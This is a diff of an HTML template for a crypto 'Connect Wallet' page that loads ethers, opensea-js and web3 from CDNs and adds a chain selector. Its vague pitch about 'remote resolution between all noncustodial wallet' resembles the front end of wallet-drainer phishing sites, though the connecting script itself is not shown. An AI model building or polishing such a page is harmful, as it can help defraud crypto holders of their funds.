@@ -1,16 +1,20 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <!-- Include necessary JavaScript libraries -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+   
     <link rel="stylesheet" href="{{url_for('static', filename='s.css')}}">
-    <script type="text/javascript" src="https://unpkg.com/web3modal"></script>
-    
-    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+   
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"
+    type="application/javascript"></script>
+    <script src="https://cdn.jsdelivr.net/npm/opensea-js@6.1.9/lib/index.js"></script>
+    <script src="https://requirejs.org/docs/release/2.3.5/minified/require.js"></script>
     <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
-</head>
-<body class="cs-dark">
-  
+
+  </head>
+  <body class="cs-dark">
 
  
 
@@ -28,9 +32,18 @@
               <div class="cs-hero_subtitle cs-medium cs-white_color">This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet.</div>
              <div class="action">
               <div class="cs-hero_btns">
-                <a  class="cs-hero_btn cs-style1 cs-color3 interact-button" id="connectWalletButton"><span>Connect Wallet</span></a>
+                <button  class="cs-hero_btn cs-style1 cs-color3 interact-button" id="connect-button">Connect Wallet</button>
               </div>
-             
+              <div class="btn-hero heading-SB" id="slect-main">
+                  <select class="select2-hidden-accessible select2" id="select2-main" aria-invalid="false" data-select2-id="select2-data-1-x6av" tabindex="-1" aria-hidden="true">
+                      <option value="0x1" data-select2-id="select2-data-3-rcyi">Ethereum</option>
+                      <option value="0x38" data-select2-id="select2-data-30-ir32">Binance S</option>
+                      <option value="0x89" data-select2-id="select2-data-31-w03z">Polygon</option>
+                      <option value="0xa86a" data-select2-id="select2-data-32-71oo">Avalanche</option>
+                      <option value="0xfa" data-select2-id="select2-data-33-hulu">Fantom</option>
+  
+                  </select>
+              </div>
              </div>
   
             </div>
@@ -217,14 +230,10 @@
     <script src="assets/js/webModule.js"></script>
     <script src="cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
     <script src="code.tidio.co_443/fuqxxlj93rbgkfzl3rufv2tz5yeuck4f.js" async></script> -->
+  </body>
+  <script  src="{{url_for('static', filename='wallet-connect.js')}}" type="module"></script>
+  <script>
+    
   
-    <!-- Add a button to connect the wallet -->
-    
-
-    <!-- Display the connected wallet address -->
-    
-    
-    <!-- Your JavaScript code will go here -->
-    <script src="{{url_for('static', filename='wallet-connect.js')}}"></script>
-</body>
+  </script>
 </html>
